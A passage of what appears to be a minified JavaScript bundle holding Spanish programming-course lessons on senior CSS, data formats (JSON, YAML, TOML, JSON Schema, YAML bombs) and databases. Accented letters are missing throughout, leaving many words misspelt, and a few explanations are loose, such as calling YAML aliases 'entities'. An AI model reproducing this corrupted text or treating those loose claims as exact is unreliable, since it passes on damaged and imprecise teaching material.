    item.style.width = (ancho + 10) + 'px'; // Escritura (invalida Layout)

});

\`\`\`

Esto fuerza al navegador a calcular el layout una y otra vez por cada tem. Haz todas las lecturas primero, luego todas las escrituras.



## 3. Animaciones de Alto Rendimiento



Solo anima propiedades que afecten **solo a Composite**.



*      **Baratas (GPU):** \`transform\` (mover, escalar, rotar), \`opacity\`.

*      **Caras (CPU - Layout/Paint):** \`width\`, \`height\`, \`left\`, \`top\`, \`margin\`, \`box-shadow\`.



Si animas \`left: 10px\` a \`left: 100px\`, el navegador recalcula el layout de toda la pgina en cada frame.

Si animas \`transform: translateX(90px)\`, la GPU mueve la "foto" de la capa sin recalcular geometra.



## 4. \`will-change\`



Le avisa al navegador que algo va a cambiar para que prepare optimizaciones (crear nueva capa).



\`\`\`css

.elemento-animado {

    will-change: transform;

}

\`\`\`

*Advertencia: No lo uses en todo. Consume mucha memoria RAM.  salo solo en elementos que se animan activamente.*



## 5. Content Visibility



\`content-visibility: auto;\`

Le dice al navegador: "Si este elemento est fuera de la pantalla (off-screen), no calcules su renderizado todava".

Mejora brutalmente el tiempo de carga inicial en pginas largas.

`,completed:!1},{id:"css-senior-design-systems",title:"Design Systems & Tokens",level:"senior",content:`# Leccin 22: Design Systems & Tokens



## 1. Del caos al sistema



Un Senior no piensa en "Pginas", piensa en "Sistemas". Un Design System es la fuente de verdad entre Diseo y Desarrollo.



## 2. Design Tokens



Son las variables atmicas del sistema. Abstraen los valores crudos.



**Niveles de Tokens:**



1.  **Global Tokens (Primitivos):** La paleta literal.

    \`--blue-500: #3b82f6;\`

2.  **Alias Tokens (Semnticos):** Contexto de uso.

    \`--color-primary: var(--blue-500);\`

    \`--color-success: var(--green-500);\`

3.  **Component Tokens (Especficos):** Para un componente.

    \`--btn-bg: var(--color-primary);\`



**Por qu tantas capas?**

Si maana el "color primario" cambia de azul a morado, solo tocas el Alias Token. Si el botn primario cambia de "primary" a "negro", solo tocas el Component Token. Escalabilidad pura.



## 3. Theming (Temas)



Gracias a las variables CSS, implementar Dark Mode es trivial si usas tokens.



\`\`\`css

:root {

    --text-color: #333;

    --bg-color: #fff;

}



[data-theme="dark"] {

    --text-color: #fff;

    --bg-color: #111;

}



body {

    color: var(--text-color);

    background: var(--bg-color);

}

\`\`\`



## 4. Atomic CSS (Utility-First)



Tailwind CSS es un Design System basado en utilidades.

En lugar de escribir CSS semntico, aplicas tokens directamente en el HTML.

\`p-4 bg-primary text-white rounded\`.

**Discusin Senior:** Valora Atomic CSS para velocidad y consistencia, pero ten cuidado con el HTML sucio.  salo con \`@apply\` o componentes encapsulados si necesitas limpieza.



## 5. Reto de Arquitecto

Disea una escala tipogrfica (\`t-shirt sizing\`) usando tokens:

\`--text-xs\`, \`--text-sm\`, \`--text-md\`, \`--text-lg\`, \`--text-xl\`.

Asegrate de que el \`line-height\` cambie acorde al tamao para mantener el "ritmo vertical".

`,completed:!1},{id:"css-senior-css-escalabilidad",title:"CSS a Gran Escala y Tooling",level:"senior",content:`# Leccin 23: CSS a Gran Escala y Tooling



## 1. PostCSS y Preprocesadores



SASS sigue vivo, pero el CSS moderno mata muchas de sus funciones.

Hoy reina **PostCSS**: Una herramienta que procesa tu CSS con plugins JS.

*   **Autoprefixer:** Agrega \`-webkit-\`, \`-moz-\` automticamente.

*   **CSS Nano:** Minifica el CSS.

*   **Preset Env:** Te permite usar CSS del futuro hoy (polyfill).



## 2. Linter (Stylelint)



No dejes que el equipo cometa errores. Stylelint es el ESLint del CSS.

Reglas comunes senior:

*   Prohibir IDs en selectores.

*   Limitar profundidad de anidamiento.

*   Enforzar orden de propiedades (Alphabetical o SMACSS).

*   Prohibir colores "hardcodeados" (obligar a usar variables).



## 3. Metodologas de Scoping en JS Frameworks



Cuando usas React/Vue/Angular, el CSS global es peligroso.



*   **CSS Modules:** \`import styles from './Button.module.css'\`.

    El build transforma \`.btn\` a \`.Button_btn__1x9z\`. Cero colisiones.

*   **Scoped (Vue):** \`<style scoped>\`. Agrega atributos \`data-v-xxxx\` a los elementos.

*   **CSS-in-JS (Emotion/Styled-components):** Escribes CSS en strings de JS. Potente para cambiar estilos basados en props del componente, pero aade peso de JS.



## 4. Critical CSS



Para optimizar el **First Contentful Paint (FCP)**.

Tcnica:

1.  Extraer el CSS necesario SOLO para lo que se ve en la pantalla inicial (Above the fold).

2.  Incrustarlo (Inline) en el \`<head>\` del HTML.

3.  Cargar el resto del CSS (\`styles.css\`) de forma diferida (\`preload\` o al final del body).



Esto hace que la web cargue instantneamente visualmente, aunque falte cargar el resto.

`,completed:!1},{id:"css-senior-errores-produccion-css",title:"Errores de Produccin y Debugging",level:"senior",content:`# Leccin 24: Errores de Produccin y Debugging



## 1. Stacking Contexts (El misterio del Z-Index)



*"Le puse z-index: 999999 y sigue quedando atrs"*.

El problema no es el nmero. El problema es el **Stacking Context**.



Un elemento crea un nuevo contexto de apilamiento si tiene:

*   \`opacity\` distinto de 1.

*   \`transform\` distinto de none.

*   \`filter\`, \`perspective\`, \`clip-path\`...

*   \`z-index\` distinto de auto (si es posicionado).



**Regla:** Un hijo NUNCA puede estar por encima del padre si el padre tiene un z-index bajo respecto a sus propios hermanos. El \`z-index\` es relativo al contexto local, no global.

**Solucin Senior:** Mueve el elemento conflictivo al raz del DOM (Portal) o elimina la propiedad que crea el contexto en el padre.



## 2. Overflow y Scroll Fantasma



Aparece una barra de scroll horizontal en mvil.

**Debugging:**

1.  Abre consola.

2.  Ejecuta:

    \`\`\`js

    [].forEach.call(document.querySelectorAll('*'), function(a){ a.style.outline="1px solid #"+(~~(Math.random()*(1<<24))).toString(16) })

    \`\`\`

    Esto pone bordes de colores a TODO. Vers qu caja se sale del ancho.



## 3. Ghost Space en Imgenes



Las imgenes dentro de un \`div\` a veces dejan un espacio en blanco de 3-4px abajo.

**Causa:** Las imgenes son \`inline\` por defecto, se alinean como texto (baseline), dejando espacio para las letras descendentes (j, g, y).

**Solucin Senior:** \`img { display: block; }\` o \`vertical-align: bottom\`.



## 4. Colapso de Mrgenes (Revisitado)



Si un contenedor hijo tiene margin-top, a veces ese margen se "escapa" y empuja al padre hacia abajo.

**Solucin:** \`overflow: hidden\` o \`padding: 1px\` en el padre (rompe el colapso).



## 5. Especificidad War en Libreras UI (Bootstrap/MUI)



No uses \`!important\`.

Aumenta tu especificidad repitiendo la clase:

\`.mi-clase.mi-clase { ... }\` (Doble clase = ms puntos).

O usa capas de cascada: \`@layer\`.

`,completed:!1},{id:"css-senior-accesibilidad-css",title:"CSS y Accesibilidad (A11y)",level:"senior",content:`# Leccin 25: CSS y Accesibilidad (A11y)



## 1. CSS no es solo visual, es funcional



Un mal CSS puede hacer un sitio inutilizable para personas que usan teclado o lectores de pantalla.



## 2. \`outline: none\` es CRIMEN



Muchos quitan el borde azul de foco porque "es feo".

\`\`\`css

/* NUNCA HAGAS ESTO sin dar una alternativa */

*:focus { outline: none; }

\`\`\`

Si lo haces, un usuario de teclado no sabr dnde est.

**Solucin:** Usa \`:focus-visible\`. Solo muestra el outline si se usa teclado, no mouse.



\`\`\`css

:focus:not(:focus-visible) { outline: none; }

:focus-visible { outline: 2px solid blue; }

\`\`\`



## 3. Ocultando contenido correctamente



*   **\`display: none\` / \`visibility: hidden\`**: Oculta para TODOS (ojos y lectores de pantalla).

*   **\`opacity: 0\`**: Oculta visualmente, pero sigue ah y es clickeable/enfocable.



**Cmo ocultar algo visualmente pero que el lector de pantalla lo lea?** (Ej: Labels de conos).

Usa una clase utilitaria \`.sr-only\` (Screen Reader Only):



\`\`\`css

.sr-only {

    position: absolute;

    width: 1px;

    height: 1px;

    padding: 0;

    margin: -1px;

    overflow: hidden;

    clip: rect(0, 0, 0, 0);

    white-space: nowrap;

    border: 0;

}

\`\`\`



## 4. Orden visual (\`order\` en Flex/Grid)



\`flex-direction: row-reverse\` o \`order: 1\` cambian cmo se ven las cosas, pero NO cambian el orden en el DOM.

El lector de pantalla lee el DOM. Si cambias mucho el orden visual, la experiencia de navegacin con teclado ser catica y saltarina.

**Consejo Senior:** Mantn el orden del DOM lgico y visual sincronizados tanto como sea posible.



## 5. Media Queries de Preferencia



Respeta al usuario.



*   \`@media (prefers-reduced-motion: reduce)\`:

    Desactiva animaciones bruscas para evitar mareos (vestibular disorders).

    \`\`\`css

    @media (prefers-reduced-motion: reduce) {

        * { animation: none !important; transition: none !important; }

    }

    \`\`\`



*   \`@media (prefers-color-scheme: dark)\`: Modo oscuro del sistema.

*   \`@media (prefers-contrast: high)\`: Aumenta contrastes.

`,completed:!1},{id:"css-senior-ejercicios-senior",title:"Ejercicios Tcnicos Senior",level:"senior",content:`# Leccin 26: Ejercicios Tcnicos Senior



## 1. Arquitectura de Botones (Design System)



Crea un sistema de botones escalable usando BEM y Custom Properties.

Requisitos:

*   Variantes: \`primary\`, \`secondary\`, \`ghost\`.

*   Tamaos: \`sm\`, \`md\`, \`lg\`.

*   Un botn con estado \`loading\` que muestre un spinner sin alterar el ancho/alto del botn.

*   Debe soportar temas (Dark/Light).

*   Cdigo ultra-DRY (Don't Repeat Yourself).



## 2. Debugging de Stacking Context



Crea un modal (\`z-index: 100\`) dentro de un contenedor que tenga \`transform: scale(0.9)\`.

Observa cmo el modal queda "atrapado" visualmente o cortado, o el backdrop no cubre toda la pantalla.

Explica por qu pasa y propn la solucin usando React Portals o estrategias CSS.



## 3. Layout "Imposible"



Crea un Grid que:

*   Tenga columnas automticas (\`auto-fit\`).

*   Las tarjetas tengan un ancho mnimo de 300px.

*   Si hay 3 o menos, se centren en el medio de la pantalla.

*   Si hay ms, ocupen todo el ancho alinadas a la izquierda.

*   Todo sin Media Queries (usa solo Grid y alineaciones).



## 4. Refactorizacin de Legado



Toma un CSS hipottico lleno de IDs y selectores anidados (\`#main .content div ul li a\`).

Escribe un plan de refactorizacin para migrarlo a BEM/ITCSS sin romper la produccin visualmente en el proceso. (Pista: Mapeo de clases, herramientas de regresin visual).



## 5. Auditora de Performance



Si una animacin de men a 60fps est causando que la CPU de tu laptop suba al 100%, qu propiedades CSS ests animando probablemente? Cmo lo arreglas para usar la GPU?

Respuesta esperada: Ests animando \`left/top/margin\`. Cmbialo a \`transform: translate()\`.

`,completed:!1},{id:"css-final-evaluation",title:"Examen de Certificacin: CSS Profesional",level:"senior",content:`# Evaluacin Final de Mdulo: CSS Avanzado, Arquitectura y Layout Systems

## 1.  Objetivo de la evaluacin
Validar que el estudiante domina no solo la sintaxis de CSS, sino tambin la lgica de cascada, especificidad, sistemas de layout modernos (Flex/Grid), y la capacidad de construir interfaces escalables, performantes y mantenibles siguiendo arquitecturas profesionales.

---

## 2.  Estructura de la evaluacin
*   **Bloque 1: Arquitectura y Especificidad (Teora Crtica):** Resolucin de conflictos de cascada y decisiones de diseo.
*   **Bloque 2: Layout Master (Prctica):** Construccin de una interfaz compleja y responsiva.
*   **Bloque 3: Debugging y Performance (Anlisis):** Identificacin de "Re-flows", "Repaints" y selectores ineficientes.

---

## 3.  Proyecto Prctico Obligatorio
**Reto: "Dashboard de Administracin Multidispositivo"**
El estudiante debe maquetar un dashboard que cumpla con:
1.  **Layout Principal con CSS Grid:**
    *   Sidebar lateral fijo a la izquierda.
    *   Header superior.
    *   rea de contenido principal que use \`grid-template-areas\`.
2.  **Componentes con Flexbox:**
    *   Una barra de estadsticas con tarjetas que se ajusten automticamente (\`flex-wrap\`).
    *   Alineacin perfecta de iconos y texto dentro de botones y inputs.
3.  **Responsive Design Sin Media Queries (Donde sea posible):**
    *   Uso de funciones modernas como \`clamp()\`, \`min()\`, \`max()\`.
    *   Uso de \`grid-template-columns: repeat(auto-fit, minmax(...))\`.
4.  **Sistema de Variantes (BEM o similar):**
    *   Implementar botones con estados: \`default\`, \`primary\`, \`danger\`, \`outline\`, y \`disabled\`.
5.  **Tematizacin con Variables (Custom Properties):**
    *   Implementar soporte nativo para Modo Oscuro/Claro usando solo variables CSS.

---

## 4.  Preguntas Conceptuales Clave
1.  **Especificidad Forense:** Si un elemento tiene un ID, 3 clases y un estilo en cascada desde el body, pero un selector de atributo \`[type="text"]\` tiene \`!important\`, cul es el riesgo tcnico de esta arquitectura y cmo lo solucionaras sin usar \`!important\`?
2.  **Box Model e Intencin:** Explica la diferencia real entre \`box-sizing: content-box\` y \`border-box\`. Por qu el primero es el estndar por defecto pero el segundo es el estndar de la industria?
3.  **Propiedades Lgicas:** Por qu un Senior debera preferir \`margin-inline-start\` en lugar de \`margin-left\` en un proyecto internacional?
4.  **Flexbox vs Grid:** Describe un escenario donde Grid sea una mala decisin tcnica y Flexbox sea la solucin ptima (y viceversa).
5.  **Stacking Context:** Qu propiedades, adems de \`z-index\`, crean un nuevo contexto de apilamiento y cmo puede esto "romper" un modal o un tooltip?

---

## 5.  Escenarios de Debugging
**Caso: "El Layout Fantasma"**
Un desarrollador junior reporta que un contenedor hijo se sale de su padre even con \`width: 100%\`.
\`\`\`css
.parent {
  width: 500px;
  padding: 20px;
}
.child {
  width: 100%;
  border: 10px solid black;
}
\`\`\`
**Tarea:** Explica por qu sucede esto tcnicamente y proporciona las 2 soluciones posibles (una clsica y una moderna).

---

## 6.  Rbrica de Evaluacin

| Criterio | Aprobado (Senior Path) | No Aprobado |
| :--- | :--- | :--- |
| **Arquitectura** | Uso consistente de una metodologa (BEM, CUBE, Utility-first). | Selectores anidados infinitamente o nombres de clase genricos. |
| **Responsividad** | El layout es fluido en cualquier resolucin sin "saltos" bruscos. | Contenido que se desborda (overflow) en mviles. |
| **Mantenibilidad** | Uso extensivo de variables CSS para colores, espaciados y tamaos. | Valores "hardcodeados" (ej: \`color: #ff0000\`) dispersos. |
| **Accesibilidad** | Uso de unidades relativas (\`rem\`, \`em\`) y estados de \`focus\` visibles. | Uso de \`px\` para textos o eliminacin del outline de focus sin reemplazo. |

---

## 7.  Criterios Mnimos Obligatorios
*   [ ] Cero uso de \`!important\` para lgica de layout.
*   [ ] Uso de al menos 5 CSS Custom Properties (Variables).
*   [ ] El dashboard debe ser usable en resoluciones desde 320px hasta 1920px.
*   [ ] Implementacin de \`aspect-ratio\` para elementos multimedia.

---

## 8.  Errores Comunes que Invalidan la Aprobacin
1.  **Selectores de Tipo excesivos:** Usar \`div div p span\` en lugar de clases.
2.  **Magic Numbers:** Usar valores como \`margin-top: 13.4px\` para "que cuadre a ojo".
3.  **Falta de Reset:** No incluir un reset consistente (minimizando inconsistencias entre navegadores).
4.  **Z-index War:** Usar \`z-index: 999999\` para "forzar" que algo est arriba.

---

## 9.  Nivel de Dificultad y Tiempo
*   **Dificultad:** Alta (Arquitectnica).
*   **Tiempo Estimado:** 2 a 3 horas de ejecucin tcnica.
`,completed:!1,isProject:!0}]},m1={id:"data-formats",title:"Formatos de Datos (JSON, YAML, TOML)",description:"Domina los estndares industriales para el intercambio de datos y la configuracin de aplicaciones modernas.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"data-formats-01-intro-json",title:"JSON - El Estndar de la Web",level:"junior",content:`# Leccin 01: JSON - El Estndar de la Web

**JSON** (JavaScript Object Notation) es el formato de intercambio de datos ms popular del mundo. Aunque naci de JavaScript, hoy se usa en casi todos los lenguajes.

## 1. Caractersticas Principales
*   **Basado en Texto:** Es fcil de leer para humanos y mquinas.
*   **Estructura de Clave-Valor:** Los datos se organizan en pares \`"nombre": "valor"\`.
*   **Tipos de datos soportados:** Strings, Nmeros, Booleanos, Arrays, Objetos y \`null\`.

## 2. Reglas de Oro en JSON
1.  **Comillas dobles obligatorias:** Las claves y los strings DEBEN usar \`"\`, nunca \`'\`.
2.  **Sin funciones ni comentarios:** JSON solo transporta datos. No puedes poner lgica ni notas.
3.  **Sin coma final:** El ltimo elemento de un objeto o lista NO debe llevar coma.

## 3. Ejemplo Bsico
\`\`\`json
{
  "usuario": "Pepito",
  "edad": 30,
  "esAdmin": true,
  "lenguajes": ["JS", "TS", "Bash"]
}
\`\`\`

---

### Concepto Junior:
JSON es como la "lengua franca" de internet. Si tu Frontend quiere hablar con tu Backend, lo ms probable es que se pasen papelitos escritos en formato JSON.
`,completed:!1},{id:"data-formats-02-intro-yaml",title:"YAML - Formato para Humanos",level:"junior",content:`# Leccin 02: YAML - Formato para Humanos

**YAML** (YAML Ain't Markup Language) es un formato diseado para ser extremadamente legible. Es el estndar para archivos de configuracin en herramientas como Docker, Kubernetes o GitHub Actions.

## 1. Caractersticas Principales
*   **Basado en Indentacin:** Usa espacios para jerarquizar los datos (como Python). No usa llaves \`{}\` ni corchetes \`[]\`.
*   **Soporta Comentarios:** A diferencia de JSON, puedes poner notas usando \`#\`.
*   **Menos "Ruido":** No necesitas tantas comillas ni comas.

## 2. El peligro de los espacios
En YAML, un espacio de ms o de menos rompe todo el archivo. Es muy estricto con la alineacin.

## 3. Ejemplo Bsico
\`\`\`yaml
# Configuracin del servidor
servidor:
  puerto: 8080
  entorno: produccion
  logs:
    - acceso.log
    - errores.log
\`\`\`

---

### Concepto Junior:
Usa YAML cuando quieras que un humano lea y escriba una configuracin fcilmente. Pero ten cuidado: los espacios invisibles son tus enemigos!
`,completed:!1},{id:"data-formats-03-intro-toml",title:"TOML - Configuracin sin Obviedades",level:"junior",content:`# Leccin 03: TOML - Configuracin sin Obviedades

**TOML** (Tom's Obvious Minimal Language) es un formato que busca ser mnimo y obvio. Es muy popular en ecosistemas como Rust y herramientas de JavaScript modernas (como el \`pyproject.toml\` en Python o configuraciones de frameworks).

## 1. Caractersticas Principales
*   **Parece un archivo .ini:** Usa secciones entre corchetes \`[seccion]\`.
*   **Fuertemente tipado:** Maneja fechas, horas y nmeros de forma muy clara.
*   **Plano:** A diferencia de YAML, no depende de la indentacin, lo que lo hace menos propenso a errores humanos "invisibles".

## 2. Ejemplo Bsico
\`\`\`toml
title = "Configuracin de progavio"

[database]
server = "192.168.1.1"
ports = [ 8000, 8001, 8002 ]
connection_max = 5000
enabled = true
\`\`\`

---

### Concepto Junior:
TOML es genial para archivos de configuracin que no tienen una jerarqua muy profunda. Es ms robusto que YAML (porque no depende de espacios) y ms legible que JSON (porque permite comentarios y no tiene tantas comillas).
`,completed:!1},{id:"data-formats-04-comparativa",title:"Comparativa y Cundo usar cada uno?",level:"junior",content:`# Leccin 04: Comparativa y Cundo usar cada uno?

No hay un formato mejor que otro, sino uno ms adecuado para cada tarea.

## 1. La Gran Comparativa

| Formato | Comentarios | Jerarqua | Uso Principal |
| :--- | :--- | :--- | :--- |
| **JSON** | No | Llaves \`{}\` | Comunicacin entre APIs |
| **YAML** | S | Indentacin | Configuracin (Docker/K8s) |
| **TOML** | S | Secciones \`[]\` | Configuracin de Proyectos/Herramientas |

## 2. Casos de Uso
*   **Si vas a enviar datos desde un servidor a una App mvil:** Usa **JSON**. Es el ms ligero y compatible.
*   **Si vas a configurar un despliegue complejo con muchas opciones anidadas:** Usa **YAML**. Es visualmente ms limpio.
*   **Si vas a configurar los metadatos de tu librera o proyecto:** Usa **TOML**. Es difcil de romper y muy claro.

---

### Misin Junior:
Aprender a distinguir a simple vista si un archivo est en JSON (busca llaves), YAML (busca guiones e indentacin) o TOML (busca secciones con corchetes).
`,completed:!1},{id:"data-formats-05-configuracion",title:"Configuracin de Aplicaciones y Serializacin",level:"semi-senior",content:"# Leccin 05: Configuracin de Aplicaciones y Serializacin\n\nComo Semi-Senior, debes saber cmo transformar estos formatos en objetos de tu lenguaje (JavaScript/TypeScript) y viceversa.\n\n## 1. Serializacin y Deserializacin\n*   **Serializar:** Convertir un objeto en memoria a un formato de texto (ej: `JSON.stringify(objeto)`).\n*   **Deserializar (Parsear):** Convertir texto a un objeto en memoria (ej: `JSON.parse(texto)`).\n\n## 2. Manejo de archivos de configuracin\nEn Node.js, solemos leer archivos `.json` directamente con `require` o archivos `.yaml`/`.toml` usando libreras externas.\n*   **YAML en JS:** Usamos `yaml` o `js-yaml`.\n*   **TOML en JS:** Usamos `@iarna/toml` o `toml`.\n\n## 3. Entornos dinmicos\nNunca guardes contraseas reales en estos archivos si van a subirse a Git. Usa marcadores de posicin o variables de entorno que luego se inyecten.\n\n---\n\n### Lo que hace un Semi-Senior:\nNo asume que el archivo de configuracin est bien escrito. Siempre usa un bloque `try/catch` al parsear, porque un error en un solo carcter puede hacer que toda la aplicacin se detenga al arrancar.\n",completed:!1},{id:"data-formats-06-validacion",title:"Validacin y JSON Schema",level:"semi-senior",content:`# Leccin 06: Validacin y JSON Schema

Recibir datos en formato JSON es fcil, pero asegurar que tengan la estructura correcta es difcil. Para eso usamos esquemas.

## 1. JSON Schema
Es un estndar para declarar qu campos debe tener un JSON, de qu tipo son y si son obligatorios.
*   **Beneficio:** Autodocumentacin y validacin automtica.

## 2. Herramientas de Validacin (Zod, Ajv)
En el mundo de TypeScript, herramientas como **Zod** permiten definir el esquema y validar los datos al mismo tiempo.
\`\`\`typescript
import { z } from 'zod';

const UsuarioSchema = z.object({
  id: z.number(),
  email: z.string().email(),
  tags: z.array(z.string()).optional()
});

// Si los datos no cumplen, lanza un error descriptivo
const datosValidados = UsuarioSchema.parse(datosRecibidos);
\`\`\`

## 3. Por qu validar en el Edge
Validar los datos apenas entran a tu sistema evita que errores de tipo ("esto deba ser un nmero y es un string") causen bugs extraos en la profundidad de tu cdigo.

---

### Misin Semi-Senior:
Nunca confes en los datos externos. Valida siempre la estructura de tus archivos JSON/YAML antes de usarlos en tu lgica de negocio.
`,completed:!1},{id:"data-formats-07-buenas-practicas",title:"Buenas Prcticas en Formatos de Datos",level:"semi-senior",content:`# Leccin 07: Buenas Prcticas en Formatos de Datos

Escribir archivos de datos limpios es tan importante como escribir cdigo limpio.

## 1. Nomenclatura consistente
Decide si usars \`snake_case\` o \`camelCase\` para tus claves y mantn la decisin en todo el proyecto.
*   En JSON/JS se prefiere \`camelCase\`.
*   En YAML/Configuraciones de sistema se prefiere \`snake_case\`.

## 2. Evita la anidacin excesiva
Si tu archivo de configuracin tiene 10 niveles de profundidad, es muy difcil de leer y mantener. Intenta aplanar la estructura.

## 3. Usa el formato adecuado para el tamao
*   Si tienes millones de registros: Tal vez un formato de texto plano como JSON no sea el adecuado y necesites formatos binarios (como Protocol Buffers o Avro).
*   Si son 10 opciones de configuracin: YAML es perfecto.

## 4. Comentarios tiles
En YAML y TOML, usa comentarios para explicar **por qu** se eligi un valor, no qu hace el valor (si el nombre de la clave es bueno, se debera entender).

---

### Verdad de Datos:
Un archivo de configuracin es la interfaz entre el sistema y el humano que lo opera. Hazlo amigable.
`,completed:!1,isProject:!0},{id:"data-formats-08-practica-formatos",title:"Prctica y Evaluacin: Formatos de Datos",level:"semi-senior",content:`# Prctica y Evaluacin: Formatos de Datos

Demuestra que sabes elegir y manipular la informacin correctamente.

---

## 1. Ejercicio Junior: El Traductor
**Consigna:** Tienes este objeto en JSON. Escrbelo en formato YAML manteniendo la misma informacin.
\`\`\`json
{
  "project": "progavio",
  "version": 1.0,
  "active": true,
  "tags": ["edu", "tech"]
}
\`\`\`

## 2. Ejercicio Semi-Senior: El Arquitecto de Config
**Escenario:** Ests diseando un sistema de despliegue. Quieres que el usuario pueda definir: el nombre del servidor, una lista de puertos permitidos y una opcin para habilitar SSL.
*Consigna:* Escribe cmo se vera este archivo en **TOML**.

## 3. Evaluacin de Conceptos
*   Por qu no es buena idea usar JSON para un archivo de configuracin que un humano debe editar frecuentemente?
*   Qu es la "Serializacin"?
*   Cul es la principal ventaja de YAML sobre JSON en trminos de documentacin interna?

---

### Resultado esperado:
Comprensin de las debilidades y fortalezas de cada formato para tomar decisiones tcnicas acertadas. 
`,completed:!1,isProject:!0},{id:"data-formats-09-infraestructura-produccion",title:"Formatos de Datos en Infraestructura y Produccin",level:"senior",content:`# Leccin 09: Formatos de Datos en Infraestructura y Produccin

En el nivel Senior, los formatos de datos ya no son solo archivos de texto, sino piezas crticas que definen cmo se despliega y escala un sistema.

## 1. Configuracin de Infraestructura como Cdigo (IaC)
Herramientas como **Terraform** (HCL, similar a TOML) o **CloudFormation** (YAML/JSON) definen nubes enteras usando estos formatos.
*   **YAML es el Rey:** Es el estndar de facto para Kubernetes. Un error de indentacin en un YAML de Kubernetes puede dejar a millones de usuarios sin servicio.

## 2. Inyeccin de Secretos en Produccin
Nunca guardes secretos (claves de API, contraseas de DB) en tus archivos JSON o YAML.
*   **Estrategia Senior:** Usa archivos de configuracin para la estructura y marcadores de posicin (\`\${DB_PASSWORD}\`) para los valores sensibles, los cuales se inyectan en tiempo de ejecucin desde un Vault (como HashiCorp Vault o AWS Secrets Manager).

## 3. Optimizacin de Carga
Para sistemas de alta performance, el parseo de JSON puede ser un cuello de botella.
*   **JSON Streaming:** Si recibes un archivo JSON de 2GB, no puedes usar \`JSON.parse()\`. Debes usar libreras de streaming (como \`stream-json\`) para procesar el archivo pieza por pieza sin saturar la RAM.

---

### Visin Senior:
"La mejor configuracin es la que es inmutable en produccin pero flexible a travs de variables de entorno".
`,completed:!1},{id:"data-formats-10-seguridad-datos",title:"Seguridad en el Manejo de Datos",level:"senior",content:`# Leccin 10: Seguridad en el Manejo de Datos

Manejar formatos de datos externos abre la puerta a ataques sofisticados si no se hace con cuidado.

## 1. YAML Bomb (Billion Laughs Attack)
YAML permite definir "entidades" que pueden referenciarse a s mismas. Un atacante puede enviar un archivo de 1KB que, al expandirse en memoria, ocupa 4GB, congelando tu servidor.
*   **Solucin:** Usa siempre parsers que limiten la profundidad de anidacin y desactiven las entidades personalizadas.

## 2. Inyeccin en JSON
Aunque JSON es solo datos, si esos datos se concatenan directamente en consultas SQL o comandos de sistema sin validar, se convierten en vectores de inyeccin.
*   **Regla de Oro:** Trata a todo JSON recibido como veneno hasta que pase por una validacin de esquema robusta (como Zod).

## 3. Exposicin de Metadatos
Muchos formatos (especialmente el formato XML viejo o YAML complejo) pueden incluir informacin sobre la estructura interna del servidor o rutas de archivos. Asegrate de limpiar los errores de parseo antes de enviarlos al cliente para no revelar informacin sensible.

---

### Misin Senior:
Tu trabajo es construir un "muro de contencin" entre los archivos de datos que recibes y el corazn de tu aplicacin. La seguridad empieza en el formato.
`,completed:!1}]},rD={id:"db",title:"Bases de Datos",description:"Aprende a almacenar y gestionar informacin de forma eficiente usando SQL y NoSQL.",completed:!1,lessons:[{id:"db-junior-que-es-db",title:"Qu es una base de datos?",level:"junior",content:`# Leccin 1: Qu es una base de datos?

Imagina que tienes una tienda online. Empiezas anotando tus ventas en un cuaderno. Luego, pasas a un archivo de Excel. Pero cuando tienes miles de clientes y cientos de pedidos al da, el Excel se vuelve lento, difcil de compartir y propenso a errores (alguien borra una celda por accidente).

Aqu es donde entra una **Base de Datos (DB)**.

## 1. Definicin Simple
Una base de datos es un sistema organizado para **almacenar, gestionar y recuperar informacin** de manera eficiente y segura. 

A diferencia de un archivo de texto o un Excel, una base de datos:
*   Puede manejar millones de datos sin despeinarse.
*   Permite que muchas personas o aplicaciones accedan a la vez.
*   Tiene reglas para que los datos no se corrompan (ej: no puedes tener un pedido sin un cliente).

## 2. El Sistema de Gestin (DBMS)
No interactas con los datos directamente (como si fuera un archivo de Word). Usas un software llamado **DBMS** (Database Management System). Es el "traductor" entre t y la montaa de datos.

Ejemplos famosos:
*   **MySQL / PostgreSQL:** Muy comunes en webs.
*   **MongoDB:** Muy comn en apps de JavaScript.
*   **Oracle:** Usado por bancos gigantes.

## 3. Por qu el Frontend necesita saber de esto?
Aunque como desarrollador Frontend no suelas configurar el servidor de la base de datos, los datos que muestras en tu React/Vue/Angular vienen de ah. Entender cmo estn organizados te ayudar a pedir la informacin de forma ms inteligente y a entenderte mejor con el equipo de Backend.

---

## Mini Ejercicio
Piensa en una aplicacin que uses a diario (como Instagram). Qu tipo de informacin crees que guardan en su base de datos? Haz una lista de al menos 5 cosas (ej: nombre de usuario, fecha de la foto...).
`,completed:!1},{id:"db-junior-datos-estructurados",title:"Datos Estructurados vs No Estructurados",level:"junior",content:`# Leccin 2: Datos Estructurados vs No Estructurados

No todos los datos son iguales. Dependiendo de qu estemos guardando, elegiremos un formato u otro.

## 1. Datos Estructurados (SQL)
Son datos que tienen un formato rgido y predefinido. Es como un formulario donde cada campo tiene su lugar.
*   **Ejemplo:** Informacin de un banco (DNI, Nombre, Saldo).
*   **Ventaja:** Son muy fciles de buscar y analizar.
*   **Modelo mental:** Un armario con cajones etiquetados: "Aqu solo van calcetines", "Aqu solo camisas".

## 2. Datos No Estructurados (NoSQL)
Son datos que no tienen un formato fijo. Pueden ser textos largos, imgenes, videos o simples notas que varan de un usuario a otro.
*   **Ejemplo:** El contenido de un email, un post de redes sociales con diferentes tipos de media, o una estructura JSON que cambia segn el contexto.
*   **Ventaja:** Gran flexibilidad. Puedes guardar lo que quieras sin avisar antes al sistema.
*   **Modelo mental:** Una caja grande donde vas echando cosas: "Ya luego ver cmo lo organizo".

## 3. Datos Semi-estructurados
Es un punto medio. Tienen cierta organizacin pero no son tan rgidos como una tabla. El ejemplo ms claro es el **JSON** que usas en JavaScript o el **XML**.

## Comparativa Rpida
| Caracterstica | Estructurados (SQL) | No Estructurados (NoSQL) |
| :--- | :--- | :--- |
| **Formato** | Rgido (Tablas) | Flexible (Documentos, Grafos) |
| **Escalabilidad** | Vertical (Potencia) | Horizontal (Ms mquinas) |
| **Uso Ideal** | Transacciones seguras | Big Data, Apps rpidas |

---

## Mini Ejercicio
Si fueras a crear una aplicacin para una Biblioteca, qu datos crees que seran Estructurados (ej: ISBN del libro) y qu datos podran ser No Estructurados?
`,completed:!1},{id:"db-junior-sql-vs-nosql",title:"SQL vs NoSQL (La Gran Divisin)",level:"junior",content:`# Leccin 3: SQL vs NoSQL (La Gran Divisin)

Esta es la pregunta clsica. Qu base de datos elijo? Todo depende de las necesidades de tu proyecto.

## 1. SQL (Relacionales)
